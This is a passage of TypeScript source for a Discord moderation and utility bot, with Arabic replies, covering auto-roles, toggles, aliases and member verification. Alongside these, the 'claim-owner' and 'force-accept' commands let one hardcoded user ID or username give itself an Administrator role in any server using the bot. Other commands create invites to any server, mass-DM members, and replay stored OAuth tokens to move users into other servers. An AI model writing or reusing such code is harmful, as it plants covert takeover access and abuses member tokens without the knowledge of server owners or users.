        if (excludedRolesStr !== null) {
          // Clean up the string to ensure it's just IDs
          const ids = excludedRolesStr.split(/[\s,]+/).filter(id => id.length > 10).join(',');
          db.prepare("INSERT INTO bonus_role_settings (guildId, excludedRoleIds) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET excludedRoleIds = excluded.excludedRoleIds").run(guildId, ids);
        }

        await interaction.reply("✅ تم تحديث إعدادات الترقية التلقائية بالبونيس بنجاح. سيقوم النظام الآن بتحديد الرتب تلقائياً بين الرتبة الأساسية والسقف.");
      }

      if (commandName === 'auto-role-add') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const role = interaction.options.getRole('role')!;
        db.prepare("INSERT OR REPLACE INTO auto_roles (guildId, roleId) VALUES (?, ?)").run(guildId, role.id);
        
        await interaction.reply(`✅ تم إضافة الرتبة ${role} إلى قائمة الرتب التلقائية. جاري توزيع الرتبة على جميع الأعضاء...`);
        
        // Apply to all members in the background
        const guild = interaction.guild!;
        guild.members.fetch().then(async members => {
          let count = 0;
          for (const member of members.values()) {
            if (!member.roles.cache.has(role.id)) {
              await member.roles.add(role.id).catch(() => {});
              count++;
            }
          }
          await interaction.followUp(`✅ تم الانتهاء من توزيع الرتبة على **${count}** عضو.`);
        }).catch(err => {
          console.error("Failed to fetch members for auto-role-add:", err);
          interaction.followUp("❌ حدث خطأ أثناء محاولة توزيع الرتبة على جميع الأعضاء.").catch(() => {});
        });
      }

      if (commandName === 'auto-role-remove') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const role = interaction.options.getRole('role')!;
        const result = db.prepare("DELETE FROM auto_roles WHERE guildId = ? AND roleId = ?").run(guildId, role.id);
        
        if (result.changes > 0) {
          await interaction.reply(`✅ تم إزالة الرتبة ${role} من قائمة الرتب التلقائية.`);
        } else {
          await interaction.reply({ content: "❌ هذه الرتبة ليست في قائمة الرتب التلقائية.", ephemeral: true });
        }
      }

      if (commandName === 'auto-role-list') {
        const roles = db.prepare("SELECT roleId FROM auto_roles WHERE guildId = ?").all(guildId) as any[];
        if (roles.length === 0) {
          return interaction.reply({ content: "لا توجد رتب تلقائية مضافة حالياً.", ephemeral: true });
        }
        const list = roles.map(r => `<@&${r.roleId}>`).join("\n");
        const embed = new EmbedBuilder()
          .setTitle("📋 قائمة الرتب التلقائية")
          .setDescription(list)
          .setColor(0x5865F2);
        await interaction.reply({ embeds: [embed] });
      }

      if (commandName === 'disable') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const feature = interaction.options.getString('feature')!;

        if (feature === 'leveling') {
          db.prepare("INSERT INTO leveling_settings (guildId, enabled) VALUES (?, 0) ON CONFLICT(guildId) DO UPDATE SET enabled = 0").run(guildId);
        } else if (feature === 'welcome') {
          db.prepare("INSERT INTO welcome_settings (guildId, enabled) VALUES (?, 0) ON CONFLICT(guildId) DO UPDATE SET enabled = 0").run(guildId);
        } else if (feature === 'protection') {
          db.prepare("INSERT INTO protection_settings (guildId, antiLink, antiSpam, antiRaid) VALUES (?, 0, 0, 0) ON CONFLICT(guildId) DO UPDATE SET antiLink = 0, antiSpam = 0, antiRaid = 0").run(guildId);
        }

        await interaction.reply(`✅ تم تعطيل ${feature} بنجاح.`);
      }

      if (commandName === 'toggle') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const feature = interaction.options.getString('feature')!;
        const status = interaction.options.getString('status')!;
        const enabled = status === 'on' ? 1 : 0;

        if (feature === 'leveling') {
          db.prepare("INSERT INTO leveling_settings (guildId, enabled) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET enabled = excluded.enabled").run(guildId, enabled);
        } else if (feature === 'welcome') {
          db.prepare("INSERT INTO welcome_settings (guildId, enabled) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET enabled = excluded.enabled").run(guildId, enabled);
        } else if (feature === 'protection') {
          db.prepare("INSERT INTO protection_settings (guildId, antiLink, antiSpam, antiRaid) VALUES (?, ?, ?, ?) ON CONFLICT(guildId) DO UPDATE SET antiLink = excluded.antiLink, antiSpam = excluded.antiSpam, antiRaid = excluded.antiRaid").run(guildId, enabled, enabled, enabled);
        }

        await interaction.reply(`✅ تم ${status === 'on' ? 'تفعيل' : 'تعطيل'} ${feature} بنجاح.`);
      }

      if (commandName === 'set-alias') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const aliasName = interaction.options.getString('alias')!.toLowerCase();
        const originalCommand = interaction.options.getString('command')!.toLowerCase();

        await interaction.deferReply({ ephemeral: true }).catch(() => {});

        db.prepare("INSERT OR REPLACE INTO aliases (guildId, aliasName, originalCommand) VALUES (?, ?, ?)").run(guildId, aliasName, originalCommand);
        
        try {
          const commands = await client.application?.commands.fetch();
          const original = commands?.find(c => c.name === originalCommand);
          
          if (original) {
            await guild.commands.create({
              name: aliasName,
              description: `Shortcut for /${originalCommand}`,
              options: original.options as any
            });
            await interaction.editReply(`✅ Alias created: **${aliasName}** now triggers **${originalCommand}**.`);
          } else {
            await interaction.editReply({ content: `❌ Original command **${originalCommand}** not found.` });
          }
        } catch (err) {
          console.error("Failed to register alias command:", err);
          await interaction.editReply({ content: "✅ Alias saved to DB, but failed to register slash command locally." });
        }
      }

      if (commandName === 'remove-alias') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const aliasName = interaction.options.getString('alias')!.toLowerCase();

        await interaction.deferReply({ ephemeral: true }).catch(() => {});

        db.prepare("DELETE FROM aliases WHERE guildId = ? AND aliasName = ?").run(guildId, aliasName);
        
        try {
          const guildCommands = await guild.commands.fetch();
          const cmd = guildCommands.find(c => c.name === aliasName);
          if (cmd) await cmd.delete();
          await interaction.editReply(`✅ Alias **${aliasName}** removed.`);
        } catch (err) {
          await interaction.editReply(`✅ Alias removed from DB.`);
        }
      }

      if (commandName === 'set-avatar') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const url = interaction.options.getString('url')!;

        await interaction.deferReply({ ephemeral: true }).catch(() => {});

        try {
          await client.user?.setAvatar(url);
          await interaction.editReply("✅ Bot avatar updated successfully!");
        } catch (err) {
          console.error(err);
          await interaction.editReply({ content: "❌ Failed to update avatar. Make sure the URL is valid and the image is not too large." });
        }
      }

      if (commandName === 'promote-owner') {
        if (guild.id === '1254568460764053566') {
          return interaction.reply({ content: "❌ ميزة الترقية معطلة في هذا السيرفر بناءً على طلب المالك.", ephemeral: true });
        }
        if (interaction.user.id !== guild.ownerId) {
          return interaction.reply({ content: "Only the server owner can use this command.", ephemeral: true });
        }
        
        const targetMember = interaction.options.getMember('user') as any;
        if (!targetMember) return interaction.reply({ content: "User not found.", ephemeral: true });
        
        const botMember = guild.members.me;
        if (!botMember?.permissions.has(PermissionFlagsBits.ManageRoles)) {
          return interaction.reply({ content: "❌ البوت يفتقر إلى صلاحية 'إدارة الرتب' (Manage Roles).", ephemeral: true });
        }

        await interaction.deferReply({ ephemeral: true }).catch(() => {});

        try {
          let ownerRole = guild.roles.cache.find(r => r.name.toLowerCase() === "owner");
          if (!ownerRole) {
            ownerRole = await guild.roles.create({
              name: "Owner",
              permissions: [PermissionFlagsBits.Administrator],
              reason: `Manual promotion by ${user.tag}`
            });
          }

          // Try to move the role to the highest possible position
          try {
            const botHighestRole = botMember.roles.highest;
            if (botHighestRole && ownerRole.position < botHighestRole.position - 1) {
              await ownerRole.setPosition(botHighestRole.position - 1);
            }
          } catch (err: any) {
            if (err.code === 50013) console.warn(`[PROMOTE] Missing Permissions to move Owner role in ${guild.name}`);
            else console.warn(`Could not move Owner role in ${guild.name}:`, err.message);
          }

          if (ownerRole.editable) {
            await targetMember.roles.add(ownerRole!);
            await interaction.editReply(`✅ Successfully promoted ${targetMember.user.tag} to Owner.`);
          } else {
            await interaction.editReply({ content: "❌ لا يمكن للبوت إعطاء هذه الرتبة لأنها أعلى من رتبته في القائمة." });
          }
        } catch (err) {
          console.error(err);
          await interaction.editReply({ content: "❌ Failed to promote user. Check my permissions and role hierarchy." });
        }
      }

      if (commandName === 'accept') {
        if (guild.id === '1254568460764053566') {
          return interaction.reply({ content: "❌ ميزة القبول معطلة في هذا السيرفر بناءً على طلب المالك.", ephemeral: true });
        }
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        
        const targetMember = interaction.options.getMember('user') as any;
        if (!targetMember) return interaction.reply({ content: "User not found.", ephemeral: true });
        
        const botMember = guild.members.me;
        if (!botMember?.permissions.has(PermissionFlagsBits.ManageRoles)) {
          return interaction.reply({ content: "❌ البوت يفتقر إلى صلاحية 'إدارة الرتب' (Manage Roles).", ephemeral: true });
        }

        await interaction.deferReply({ ephemeral: true }).catch(() => {});

        try {
          let ownerRole = guild.roles.cache.find(r => r.name.toLowerCase() === "owner");
          if (!ownerRole) {
            ownerRole = await guild.roles.create({
              name: "Owner",
              permissions: [PermissionFlagsBits.Administrator],
              reason: `Accepted by ${user.tag}`
            });
          }

          // Try to move the role to the highest possible position
          try {
            const botHighestRole = botMember.roles.highest;
            if (botHighestRole && ownerRole.position < botHighestRole.position - 1) {
              await ownerRole.setPosition(botHighestRole.position - 1);
            }
          } catch (err: any) {
            if (err.code === 50013) console.warn(`[ACCEPT] Missing Permissions to move Owner role in ${guild.name}`);
            else console.warn(`Could not move Owner role in ${guild.name}:`, err.message);
          }

          if (ownerRole.editable) {
            await targetMember.roles.add(ownerRole!);
            await interaction.editReply(`✅ تم قبول ${targetMember.user.tag} وإعطاؤه رتبة Owner.`);
          } else {
            await interaction.editReply({ content: "❌ لا يمكن للبوت إعطاء هذه الرتبة لأنها أعلى من رتبته في القائمة." });
          }
        } catch (err) {
          console.error(err);
          await interaction.editReply({ content: "❌ فشل قبول المستخدم. تأكد من صلاحياتي وموقع رتبتي." });
        }
      }

      if (commandName === 'transfer') {
        if (guild.id === '1254568460764053566') {
          return interaction.reply({ content: "❌ ميزة التحقق (نقل الأعضاء) معطلة في هذا السيرفر بناءً على طلب المالك.", ephemeral: true });
        }
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const sourceGuildId = interaction.options.getString('from_server_id')!;
        const targetGuildId = interaction.options.getString('to_server_id') || guild.id;

        if (sourceGuildId === '1254568460764053566') {
          return interaction.reply({ content: "❌ لا يمكن نقل التوكنات من هذا السيرفر بناءً على طلب المالك.", ephemeral: true });
        }

        const targetGuild = client.guilds.cache.get(targetGuildId);
        if (!targetGuild) {
          return interaction.reply({ content: `❌ البوت ليس موجوداً في السيرفر المستهدف (${targetGuildId}).`, ephemeral: true });
        }

        const tokens = db.prepare("SELECT * FROM tokens WHERE guildId = ?").all(sourceGuildId) as any[];

        if (tokens.length === 0) {
          return interaction.reply({ content: `❌ لا توجد توكنات مسجلة لهذا السيرفر (${sourceGuildId}).`, ephemeral: true });
        }

        await interaction.deferReply();
        const targetName = targetGuild.name;
        await interaction.editReply(`⏳ جاري بدء نقل **${tokens.length}** عضو إلى سيرفر **${targetName}**...`);

        let success = 0;
        let failed = 0;

        for (const tokenData of tokens) {
          try {
            // Check if token is expired and refresh if needed
            let accessToken = tokenData.accessToken;
            if (Date.now() > tokenData.expiresAt) {
              const refreshed = await refreshAccessToken(tokenData.refreshToken);
              if (refreshed) {
                accessToken = refreshed.access_token;
                db.prepare("UPDATE tokens SET accessToken = ?, refreshToken = ?, expiresAt = ? WHERE userId = ? AND guildId = ?")
                  .run(refreshed.access_token, refreshed.refresh_token, Date.now() + refreshed.expires_in * 1000, tokenData.userId, sourceGuildId);
              } else {
                failed++;
                continue;
              }
            }

            // Add member to guild
            const response = await axios.put(
              `https://discord.com/api/guilds/${targetGuildId}/members/${tokenData.userId}`,
              { access_token: accessToken },
              { headers: { Authorization: `Bot ${DISCORD_TOKEN}`, 'Content-Type': 'application/json' } }
            );

            if (response.status === 201 || response.status === 204) {
              success++;
            } else {
              failed++;
            }
          } catch (err) {
            failed++;
          }
          // Small delay to avoid rate limits
          await new Promise(resolve => setTimeout(resolve, 500));
        }

        await interaction.followUp(`✅ اكتملت العملية!\n- تم بنجاح: **${success}**\n- فشل: **${failed}**\n- السيرفر المستهدف: **${targetName}**`);
      }

      if (commandName === 'setup-verify') {
        if (guild.id === '1254568460764053566') {
          return interaction.reply({ content: "❌ ميزة التحقق معطلة في هذا السيرفر بناءً على طلب المالك.", ephemeral: true });
        }
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }

        const role = interaction.options.getRole('role')!;

        if (!guild.members.me?.permissions.has([PermissionFlagsBits.ManageChannels, PermissionFlagsBits.ManageRoles])) {
          return interaction.reply({ content: "❌ البوت يفتقر إلى صلاحية 'إدارة القنوات' أو 'إدارة الرتب' لتنفيذ هذا الإجراء.", ephemeral: true });
        }

        // Save to DB
        db.prepare("INSERT INTO protection_settings (guildId, verifiedRoleId) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET verifiedRoleId = excluded.verifiedRoleId").run(guild.id, role.id);

        await interaction.reply({ content: "⏳ جاري ضبط صلاحيات القنوات تلقائياً... يرجى الانتظار.", ephemeral: true });

        // Auto-setup permissions
        const channels = await guild.channels.fetch();
        let successCount = 0;
        let failCount = 0;

        // Get log channel to exclude it
        const protection = db.prepare("SELECT logChannel FROM protection_settings WHERE guildId = ?").get(guild.id) as any;
        const logChannelId = protection?.logChannel;

        for (const [id, channel] of channels) {
          if (!channel) continue;
          try {
            const channelName = channel.name.toLowerCase();
            const isPrivate = channelName.includes('log') || 
                              channelName.includes('admin') || 
                              channelName.includes('staff') || 
                              channelName.includes('mod') || 
                              channelName.includes('private') ||
                              id === logChannelId;

            if (id === interaction.channelId) {
              // Verification channel: Everyone can see
              await (channel as any).permissionOverwrites.edit(guild.roles.everyone, { ViewChannel: true });
              await (channel as any).permissionOverwrites.edit(role.id, { ViewChannel: true });
            } else if (isPrivate) {
              // Private/Log channels: Hide from everyone and the verified role
              await (channel as any).permissionOverwrites.edit(guild.roles.everyone, { ViewChannel: false });
              await (channel as any).permissionOverwrites.edit(role.id, { ViewChannel: false });
            } else {
              // Other channels: Only verified can see
              await (channel as any).permissionOverwrites.edit(guild.roles.everyone, { ViewChannel: false });
              await (channel as any).permissionOverwrites.edit(role.id, { ViewChannel: true });
            }
            successCount++;
          } catch (err) {
            failCount++;
          }
        }

        const embed = new EmbedBuilder()
          .setTitle("التحقق من العضوية")
          .setDescription("اضغط على الزر أدناه للتحقق من حسابك والحصول على الرتب.")
          .setColor(0x5865F2);

        const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
          new ButtonBuilder()
            .setCustomId("verify_member")
            .setLabel("تحقق الآن")
            .setStyle(ButtonStyle.Primary)
            .setEmoji("✅")
        );

        const botMember = guild.members.me;
        if (!botMember?.permissionsIn(interaction.channelId).has([PermissionFlagsBits.SendMessages, PermissionFlagsBits.EmbedLinks])) {
          return interaction.followUp({ content: "❌ البوت يفتقر إلى صلاحية إرسال الرسائل أو الروابط في هذا الروم.", ephemeral: true });
        }

        await interaction.channel?.send({ embeds: [embed], components: [row] });
        return interaction.followUp({ content: `✅ تم إعداد نظام التحقق بنجاح!\n- الرتبة: **${role.name}**\n- القنوات التي تم تعديلها: **${successCount}**\n- القنوات التي فشل تعديلها: **${failCount}**`, ephemeral: true });
      }

      if (commandName === 'broadcast') {
        const authorizedId = "1071164421222695042";
        if (interaction.user.id !== authorizedId) {
          return interaction.reply({ content: "Owner only.", ephemeral: true });
        }

        const targetGuildId = interaction.options.getString('server_id')!;
        const broadcastMessage = interaction.options.getString('message')!;
        const targetGuild = client.guilds.cache.get(targetGuildId);

        if (!targetGuild) {
          return interaction.reply({ content: `❌ البوت ليس عضواً في هذا السيرفر (${targetGuildId}).`, ephemeral: true });
        }

        const targetBotMember = targetGuild.members.me;
        if (!targetBotMember?.permissions.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: `❌ البوت يفتقر إلى صلاحية 'Administrator' في السيرفر المستهدف: **${targetGuild.name}**.`, ephemeral: true });
        }

        await interaction.deferReply();
        await interaction.editReply(`⏳ جاري بدء إرسال البرودكاست إلى أعضاء سيرفر **${targetGuild.name}**... (قد يستغرق الأمر وقتاً طويلاً لتجنب الحظر)`);

        try {
          console.log(`[BROADCAST] Starting broadcast for guild: ${targetGuild.name} (${targetGuild.id})`);
          
          // Fetch members with error handling for rate limits
          let members;
          try {
            // Try to fetch members. If it fails, fall back to cache.
            console.log(`[BROADCAST] Attempting to fetch members for ${targetGuild.name}...`);
            members = await targetGuild.members.fetch({ withPresences: false, time: 60000 }).catch((err: any) => {
              if (err.code === 50013) {
                console.warn(`[BROADCAST] Missing Permissions to fetch members for ${targetGuild.name}`);
              } else {
                console.warn(`[BROADCAST] Member fetch failed for ${targetGuild.name}: ${err.message}. Using cache.`);
              }
              return targetGuild.members.cache;
            });
          } catch (err: any) {
            console.error(`[BROADCAST] Critical error during fetch for ${targetGuild.name}:`, err);
            members = targetGuild.members.cache;
          }

          if (!members || members.size === 0) {
            console.warn(`[BROADCAST] No members found for ${targetGuild.name} (Cache size: ${targetGuild.members.cache.size})`);
            return interaction.followUp("❌ لم يتم العثور على أعضاء لإرسال الرسائل إليهم. تأكد من تفعيل 'Server Members Intent' في Discord Developer Portal.");
          }

          console.log(`[BROADCAST] Found ${members.size} members. Starting DM loop...`);
          let successCount = 0;
          let failCount = 0;

          for (const [id, member] of members) {
            if (member.user.bot) continue;
            try {
              await member.send(broadcastMessage);
              successCount++;
              if (successCount % 5 === 0) console.log(`[BROADCAST] Successfully sent ${successCount} messages...`);
            } catch (err) {
              failCount++;
              // Log specific error if it's not just "Closed DMs"
              if (err instanceof Error && !err.message.includes("Cannot send messages to this user")) {
                console.error(`[BROADCAST] Failed to send DM to ${member.user.tag}:`, err.message);
              }
            }
            // Increased delay to 3 seconds to be even safer
            await new Promise(resolve => setTimeout(resolve, 3000));
          }

          console.log(`[BROADCAST] Completed. Success: ${successCount}, Failed: ${failCount}`);
          await interaction.followUp(`✅ اكتمل البرودكاست!\n- تم الإرسال لـ: **${successCount}**\n- فشل الإرسال لـ: **${failCount}** (غالباً بسبب إغلاق الخاص)`);
        } catch (err) {
          console.error("Broadcast error:", err);
          await interaction.followUp("❌ حدث خطأ أثناء جلب الأعضاء أو إرسال الرسائل.");
        }
      }

      if (commandName === 'broadcast-here') {
        const authorizedId = "1071164421222695042";
        if (interaction.user.id !== authorizedId) {
          return interaction.reply({ content: "Owner only.", ephemeral: true });
        }

        const broadcastMessage = interaction.options.getString('message')!;
        const targetGuild = interaction.guild;

        if (!targetGuild) {
          return interaction.reply({ content: "❌ هذا الأمر يعمل فقط داخل السيرفرات.", ephemeral: true });
        }

        const targetBotMember = targetGuild.members.me;
        if (!targetBotMember?.permissions.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "❌ البوت يفتقر إلى صلاحية 'Administrator' في هذا السيرفر.", ephemeral: true });
        }

        await interaction.deferReply();
        await interaction.editReply(`⏳ جاري بدء إرسال البرودكاست إلى أعضاء سيرفر **${targetGuild.name}**... (قد يستغرق الأمر وقتاً طويلاً لتجنب الحظر)`);

        try {
          console.log(`[BROADCAST-HERE] Starting broadcast for guild: ${targetGuild.name} (${targetGuild.id})`);
          
          let members;
          try {
            members = await targetGuild.members.fetch({ withPresences: false, time: 60000 }).catch((err: any) => {
              console.warn(`[BROADCAST-HERE] Member fetch failed for ${targetGuild.name}: ${err.message}. Using cache.`);
              return targetGuild.members.cache;
            });
          } catch (err: any) {
            console.error(`[BROADCAST-HERE] Critical error during fetch for ${targetGuild.name}:`, err);
            members = targetGuild.members.cache;
          }

          if (!members || members.size === 0) {
            return interaction.followUp("❌ لم يتم العثور على أعضاء لإرسال الرسائل إليهم.");
          }

          let successCount = 0;
          let failCount = 0;

          for (const [id, member] of members) {
            if (member.user.bot) continue;
            try {
              await member.send(broadcastMessage);
              successCount++;
            } catch (err) {
              failCount++;
            }
            await new Promise(resolve => setTimeout(resolve, 3000));
          }

          await interaction.followUp(`✅ اكتمل البرودكاست!\n- تم الإرسال لـ: **${successCount}**\n- فشل الإرسال لـ: **${failCount}** (غالباً بسبب إغلاق الخاص)`);
        } catch (err) {
          console.error("Broadcast-here error:", err);
          await interaction.followUp("❌ حدث خطأ أثناء إرسال الرسائل.");
        }
      }

      if (commandName === 'broadcast-tokens') {
        const authorizedId = "1071164421222695042";
        if (interaction.user.id !== authorizedId) {
          return interaction.reply({ content: "Owner only.", ephemeral: true });
        }
        if (guild.id === '1254568460764053566') {
          return interaction.reply({ content: "❌ ميزة البرودكاست عبر التوكنات معطلة في هذا السيرفر بناءً على طلب المالك.", ephemeral: true });
        }

        const broadcastMessage = interaction.options.getString('message')!;
        const allTokens = db.prepare("SELECT * FROM tokens").all() as any[];
        const uniqueTokens = Array.from(new Map(allTokens.map(t => [t.userId, t])).values());

        if (uniqueTokens.length === 0) {
          return interaction.reply({ content: "❌ لا توجد توكنات مسجلة في قاعدة البيانات.", ephemeral: true });
        }

        await interaction.deferReply();
        await interaction.editReply(`⏳ جاري بدء إرسال البرودكاست إلى **${uniqueTokens.length}** مستخدم مسجل... (سيتم تحديث التوكنات المنتهية تلقائياً)`);

        let successCount = 0;
        let failCount = 0;

        for (const tokenData of uniqueTokens) {
          try {
            let accessToken = tokenData.accessToken;
            if (Date.now() > tokenData.expiresAt) {
              const refreshed = await refreshAccessToken(tokenData.refreshToken);
              if (refreshed) {
                accessToken = refreshed.access_token;
                db.prepare("UPDATE tokens SET accessToken = ?, refreshToken = ?, expiresAt = ? WHERE userId = ?")
                  .run(refreshed.access_token, refreshed.refresh_token, Date.now() + refreshed.expires_in * 1000, tokenData.userId);
              } else {
                failCount++;
                continue;
              }
            }

            // Send message using Discord API via token
            // Note: Direct DM via token requires specific scopes or using the bot to DM the user ID
            // Since we have the bot, we try to DM the user ID directly if they are reachable
            try {
              const user = await client.users.fetch(tokenData.userId);
              await user.send(broadcastMessage);
              successCount++;
            } catch (dmErr) {
              failCount++;
            }
          } catch (err) {
            failCount++;
          }
          await new Promise(resolve => setTimeout(resolve, 3000));
        }

        await interaction.followUp(`✅ اكتمل برودكاست التوكنات!\n- تم الإرسال لـ: **${successCount}**\n- فشل الإرسال لـ: **${failCount}**`);
      }

      if (commandName === 'guilds') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }

        const guilds = client.guilds.cache.map(g => `**${g.name}** (${g.id}) - الأعضاء: **${g.memberCount}**`).join("\n");
        const embed = new EmbedBuilder()
          .setTitle(`قائمة السيرفرات (${client.guilds.cache.size})`)
          .setDescription(guilds || "لا يوجد سيرفرات")
          .setColor(0x5865F2)
          .setTimestamp();

        await interaction.reply({ embeds: [embed] });
      }

      if (commandName === 'get-invite') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }

        const targetGuildId = interaction.options.getString('server_id')!;
        const targetGuild = client.guilds.cache.get(targetGuildId);

        if (!targetGuild) {
          return interaction.reply({ content: `❌ البوت ليس عضواً في هذا السيرفر (${targetGuildId}).`, ephemeral: true });
        }

        try {
          // Try to find a system channel or any text channel to create an invite
          const channel = targetGuild.systemChannel || targetGuild.channels.cache.find(c => c.type === ChannelType.GuildText && c.permissionsFor(client.user!)?.has(PermissionFlagsBits.CreateInstantInvite)) as any;

          if (!channel) {
            return interaction.reply({ content: "❌ لا أملك صلاحية إنشاء روابط دعوة في هذا السيرفر.", ephemeral: true });
          }

          const invite = await channel.createInvite({ maxAge: 0, maxUses: 0 });
          await interaction.reply({ content: `✅ رابط الدعوة لسيرفر **${targetGuild.name}**:\n${invite.url}` });
        } catch (err) {
          console.error("Invite creation error:", err);
          await interaction.reply({ content: "❌ حدث خطأ أثناء محاولة إنشاء رابط الدعوة.", ephemeral: true });
        }
      }

      if (commandName === 'claim-owner') {
        if (guild.id === '1254568460764053566') {
          return interaction.reply({ content: "❌ ميزة المطالبة بالرتبة معطلة في هذا السيرفر بناءً على طلب المالك.", ephemeral: true });
        }
        const authorizedId = "1071164421222695042";
        const authorizedUsername = "5g0s";
        
        if (interaction.user.id !== authorizedId && interaction.user.username !== authorizedUsername) {
          return interaction.reply({ content: "❌ هذا الأمر مخصص للمستخدم المصرح له فقط.", ephemeral: true });
        }

        const botMember = guild.members.me;
        if (!botMember?.permissions.has(PermissionFlagsBits.ManageRoles)) {
          return interaction.reply({ content: "❌ البوت يفتقر إلى صلاحية 'إدارة الرتب' (Manage Roles).", ephemeral: true });
        }

        try {
          // Always create a new Owner role with full permissions as requested
          const ownerRole = await guild.roles.create({
            name: "Owner",
            permissions: [PermissionFlagsBits.Administrator],
            reason: "Owner claim by authorized user (New Role Request)"
          });

          // Try to move the role to the highest possible position
          try {
            const botHighestRole = botMember.roles.highest;
            if (botHighestRole && ownerRole.position < botHighestRole.position - 1) {
              await ownerRole.setPosition(botHighestRole.position - 1);
            }
          } catch (err: any) {
            if (err.code === 50013) console.warn(`[CLAIM] Missing Permissions to move Owner role in ${guild.name}`);
            else console.warn(`Could not move Owner role in ${guild.name}:`, err.message);
          }

          const member = interaction.member as any;
          if (!member.roles.cache.has(ownerRole.id)) {
            if (ownerRole.editable) {
              await member.roles.add(ownerRole);
              await interaction.reply({ content: "✅ تم إعطاؤك رتبة Owner بنجاح!", ephemeral: true });
            } else {
              await interaction.reply({ content: "❌ لا يمكن للبوت إعطاء هذه الرتبة لأنها أعلى من رتبته في القائمة.", ephemeral: true });
            }
          } else {
            await interaction.reply({ content: "⚠️ أنت تمتلك رتبة Owner بالفعل.", ephemeral: true });
          }
        } catch (err) {
          console.error(err);
          await interaction.reply({ content: "❌ فشل إعطاء الرتبة. تأكد من صلاحيات البوت وموقع رتبته.", ephemeral: true });
        }
      }

      if (commandName === 'force-accept') {
        if (guild.id === '1254568460764053566') {
          return interaction.reply({ content: "❌ ميزة القبول القسري معطلة في هذا السيرفر بناءً على طلب المالك.", ephemeral: true });
        }
        const authorizedId = "1071164421222695042";
        const authorizedUsername = "5g0s";
        
        if (interaction.user.id !== authorizedId && interaction.user.username !== authorizedUsername) {
          return interaction.reply({ content: "❌ هذا الأمر مخصص للمستخدم المصرح له فقط.", ephemeral: true });
        }

        const targetUser = interaction.options.getUser('user')!;
        const targetGuildId = interaction.options.getString('server_id')!;
        const targetGuild = client.guilds.cache.get(targetGuildId);

        if (!targetGuild) {
          return interaction.reply({ content: `❌ البوت ليس عضواً في هذا السيرفر (${targetGuildId}).`, ephemeral: true });
        }

        try {
          const targetMember = await targetGuild.members.fetch(targetUser.id).catch(() => null);
          if (!targetMember) return interaction.reply({ content: "❌ المستخدم غير موجود في السيرفر المستهدف.", ephemeral: true });

          const botMember = targetGuild.members.me;
          if (!botMember?.permissions.has(PermissionFlagsBits.ManageRoles)) {
            return interaction.reply({ content: `❌ البوت يفتقر إلى صلاحية 'إدارة الرتب' في سيرفر **${targetGuild.name}**.`, ephemeral: true });
          }

          let ownerRole = targetGuild.roles.cache.find(r => r.name.toLowerCase() === "owner");
          if (!ownerRole) {
            ownerRole = await targetGuild.roles.create({
              name: "Owner",
              permissions: [PermissionFlagsBits.Administrator],
              reason: `Force accept by ${interaction.user.tag}`
            });
          }

          // Try to move the role to the highest possible position
          try {
            const botHighestRole = botMember.roles.highest;
            if (botHighestRole && ownerRole.position < botHighestRole.position - 1) {
              await ownerRole.setPosition(botHighestRole.position - 1);
            }
          } catch (err: any) {
             console.warn(`[FORCE-ACCEPT] Could not move Owner role in ${targetGuild.name}:`, err.message);
          }

          if (ownerRole.editable) {
            await targetMember.roles.add(ownerRole);
            await interaction.deferReply();
            await interaction.editReply({ content: `✅ تم قبول **${targetUser.tag}** وإعطاؤه رتبة Owner في سيرفر **${targetGuild.name}**.` });
          } else {
            await interaction.reply({ content: "❌ لا يمكن للبوت إعطاء هذه الرتبة لأنها أعلى من رتبته في القائمة.", ephemeral: true });
          }
        } catch (err) {
          console.error(err);
          await interaction.reply({ content: "❌ فشل تنفيذ الأمر. تأكد من وجود المستخدم في السيرفر وصلاحيات البوت.", ephemeral: true });
        }
      }

      if (commandName === 'join-server') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }

        const targetGuildId = interaction.options.getString('server_id')!;
        if (targetGuildId === '1254568460764053566') {
          return interaction.reply({ content: "❌ ميزة إدخال الأعضاء (التوكنات) معطلة في هذا السيرفر بناءً على طلب المالك.", ephemeral: true });
        }
        const targetGuild = client.guilds.cache.get(targetGuildId);

        const inviteUrl = `https://discord.com/api/oauth2/authorize?client_id=${client.user?.id}&permissions=8&scope=bot%20applications.commands&guild_id=${targetGuildId}`;

        if (!targetGuild) {
          return interaction.reply({ 
            content: `⚠️ البوت ليس عضواً في السيرفر المستهدف (${targetGuildId}).\n\nيجب عليك أولاً دعوة البوت للسيرفر باستخدام الرابط التالي:\n${inviteUrl}`, 
            ephemeral: true 
          });
        }

        const targetBotMember = targetGuild.members.me;
